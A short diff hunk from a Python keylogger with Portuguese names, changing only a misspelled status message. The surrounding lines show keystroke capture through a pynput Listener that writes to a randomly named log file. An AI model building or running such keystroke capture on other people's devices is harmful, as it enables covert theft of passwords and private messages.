@@ -16,7 +16,7 @@ def escrita_keylogger(key):
                 encerrar_keylogger()
 log = f'arquivologger{random.randint(0,1000)}.txt'
 
-print('keylogger capiturando')
+print('keylogger capturando')
 with Listener(on_press=escrita_keylogger) as log:
         try:
             log.join()
